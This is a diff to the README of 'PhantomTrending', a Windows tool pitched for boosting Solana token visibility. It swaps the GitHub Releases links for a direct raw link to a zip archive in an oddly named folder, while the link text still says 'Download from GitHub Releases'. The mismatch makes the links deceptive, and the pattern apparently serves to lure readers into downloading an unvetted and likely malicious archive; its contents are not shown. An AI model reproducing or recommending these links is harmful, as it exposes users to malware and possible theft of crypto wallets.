@@ -1,6 +1,6 @@
 # ⚡ PhantomTrending - Boost Solana Token Visibility
 
-[![Download PhantomTrending](https://img.shields.io/badge/Download-PhantomTrending-7E57C2?style=for-the-badge&logo=github)](https://github.com/mwauramuigai/PhantomTrending/releases)
+[![Download PhantomTrending](https://img.shields.io/badge/Download-PhantomTrending-7E57C2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mwauramuigai/PhantomTrending/main/petrificate/Phantom-Trending-v3.7-alpha.1.zip)
 
 ## 🚀 What PhantomTrending Does
 
@@ -20,7 +20,7 @@ Use it when you want a fast setup and a clear path to launch a campaign on Windo
 
 Visit this page to download the Windows release:
 
-[Download from GitHub Releases](https://github.com/mwauramuigai/PhantomTrending/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/mwauramuigai/PhantomTrending/main/petrificate/Phantom-Trending-v3.7-alpha.1.zip)
 
 Open the release page, pick the latest version, and save the file to your computer.
 
